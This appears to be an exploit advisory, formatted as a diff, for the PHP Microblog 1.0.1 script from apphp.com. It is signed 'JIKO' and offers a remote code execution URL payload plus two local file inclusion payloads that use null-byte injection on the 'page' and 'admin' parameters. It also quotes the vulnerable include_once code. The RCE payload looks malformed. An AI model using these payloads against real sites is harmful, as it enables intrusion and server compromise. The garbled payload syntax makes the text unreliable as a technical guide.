@@ -1,0 +1,34 @@
+----------[exploit Debut]
+[Multiple Vulnerability]
+----------[Script Info]
+ 
+Moi : JIKO
+Site    : No-exploit.Com
+
+ 
+----------[Script Info]
+ 
+Site        : http://www.apphp.com
+Download    : http://www.apphp.com/downloads_free/php_microblog_101.zip
+ 
+----------[exploit Info]
+ 
+~[RCE]
+http://path/index.php?jiko);system((dir)=/
+~[LFI]
+http://path/index.php?index.php?page=FILE%00 (you need to baypass the filter)
+http://path/index.php?index.php?admin=FILE%00 (you need to baypass the filter)
+
+if (($page != "") && file_exists("page/" . $page . ".php")) {
+                        include_once("page/" . $page . 
+
+".php");
+                    } else if (($admin != "") && 
+
+file_exists("admin/" . $admin . ".php")) {
+                        include_once("admin/" . $admin 
+
+. ".php");
+                    } 
+----------[exploit Fin]
+ 		 	   		  
